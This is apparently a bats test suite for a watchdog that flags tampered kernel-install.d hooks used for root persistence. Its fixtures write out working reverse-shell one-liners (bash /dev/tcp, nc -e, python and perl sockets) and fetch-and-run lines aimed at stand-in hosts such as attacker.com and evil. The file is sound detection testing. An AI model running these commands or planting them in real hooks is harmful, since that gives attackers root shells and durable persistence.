#!/usr/bin/env bats
# L2 bats functional tests for the kernel-install-hooks-watchdog scan script.
#
# kernel-install runs the scripts in /etc/kernel/install.d (and
# /usr/lib/kernel/install.d) AS ROOT on every kernel package install/remove
# — a routine, recurring trigger that makes a planted hook durable root-exec
# persistence (T1546). A hook that is world-writable / non-root-owned, or
# contains a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-kernel-install-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/kernel-install-hooks-watchdog/systemd/kernel-install-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    HOOKD="${TMP}/install.d"; mkdir -p "${HOOKD}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_KHOOK_PROFILE="${PROFILE:-report}" \
    SELFDEF_KHOOK_BASELINE="${BASELINE}" \
    SELFDEF_KHOOK_DIRS="${DIRS_V:-$HOOKD}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# 50-depmod.install\necho "run depmod"\n' > "${HOOKD}/50-depmod.install"
}

@test "no kernel-install hooks → ok / no_kernel_hooks" {
    DIRS_V="${TMP}/empty" run_wd
    cap | grep -q '"event":"no_kernel_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign hook, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / kernel_hooks_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"kernel_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "a hook containing an injection pattern → alert / kernel_hooks_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"kernel_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable hook → alert" {
    seed_benign
    run_wd
    chmod 0666 "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign hook change → warn / kernel_hooks_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# 50-depmod.install updated\necho "depmod -a"\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"kernel_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned hook is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious hook" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — kernel-install hook inventory enumerates root-exec-on-kernel-upgrade surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in kernel-install hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in kernel-install hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in kernel-install hook → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable hook): group-writable → alert above world-writable bar" {
    seed_benign
    run_wd
    chmod 0664 "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable kernel-install hook): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "DELTA detect — ADDED hook (attacker drops a new kernel-install hook) surfaces in sample" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho "new"\n' > "${HOOKD}/distinctive-attacker-hook"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-kernel-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): kernel-install-hooks-watchdog does NOT refresh baseline on injection detection — alert STAYS until operator updates" {
    # T1546 kernel-upgrade-triggered root exec persistence — injection
    # alert MUST persist across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"kernel_hooks_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # kernel-install hook scripts are /bin/sh; # comments. Operator
    # notes about hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# 50-depmod.install\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\necho "run depmod"\n' > "${HOOKD}/50-depmod.install"
    run_wd
    ! cap | grep -q '"event":"kernel_hooks_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/kernel/install.d + /usr/lib/kernel/install.d axes — injection in ANY → alert)" {
    # kernel-install reads from BOTH /etc + /usr/lib install.d dirs.
    # Attacker may plant in either. Lock multi-dir axis.
    HOOKD2="${TMP}/lib-install.d"; mkdir -p "${HOOKD2}"
    seed_benign
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in second dir.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD2}/evil-hook.install"
    DIRS_V="${HOOKD} ${HOOKD2}" run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in kernel-install hook: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks nc reverse-shell variant INVARIANTs
    # across the brain. Lock the netcat axis on the kernel-upgrade-
    # triggered root-exec persistence surface (T1546 — kernel-install
    # runs hook scripts AS ROOT on every kernel package install/
    # remove — recurring trigger that makes a planted hook durable).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on kernel-install hook surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the kernel-
    # upgrade-triggered root-exec persistence surface (T1546 —
    # kernel-install runs hook scripts AS ROOT on every kernel
    # package install/remove — recurring trigger that makes a
    # planted hook durable across reboots).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named kernel-install hook surfaces in sample for operator-triage routing)" {
    # Sister to many other watchdog DELTA-detect sample-naming
    # INVARIANTs across the brain. When an attacker drops a new
    # kernel-install.d hook file (T1546 — kernel-package-event
    # trigger root-exec persistence; kernel-install runs hook
    # scripts AS ROOT after every kernel install/upgrade/remove —
    # recurring trigger that makes a planted hook durable across
    # reboots), the file name MUST surface in the JSON sample so
    # operator dashboard routes triage to the right path.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${HOOKD}/99-distinctive-attacker-hook.install"
    run_wd
    cap | grep -q 'distinctive-attacker-hook'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on kernel-install hook surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp kernel-
    # install-hook variants. Perl on every Debian/Ubuntu. Locks
    # perl axis on T1546 kernel-package-event trigger root-exec
    # persistence — kernel-install runs hook scripts AS ROOT on
    # every kernel install/upgrade/remove.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${HOOKD}/50-depmod.install"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-kernel-hooks -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (exec-path under writable-root: kernel-install hook invoking binary from /var/tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1542
    # Pre-OS Boot — kernel-install hooks fire AS ROOT on every
    # kernel package install/upgrade (operator-routine package
    # upgrades trigger). Beyond inline rev-shell payloads,
    # attackers stage benign-looking hooks that invoke binary
    # in writable-root.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/var/tmp/staged_payload\n' > "${HOOKD}/50-depmod.install"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on kernel-install-hooks surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The kernel-install-hooks-watchdog MUST only emit severity
    # values from the closed set {ok,warn,alert} — never custom
    # values (critical, error, fatal, notice, info). Operator
    # dashboard parsers branch on the literal severity string;
    # an out-of-set value silently falls through routing and
    # the operator never sees the T1542 Pre-OS Boot persistence
    # via kernel-install hook injection alert. Locks parser
    # contract on the kernel/install.d detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\n' > "${HOOKD}/50-depmod.install"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}
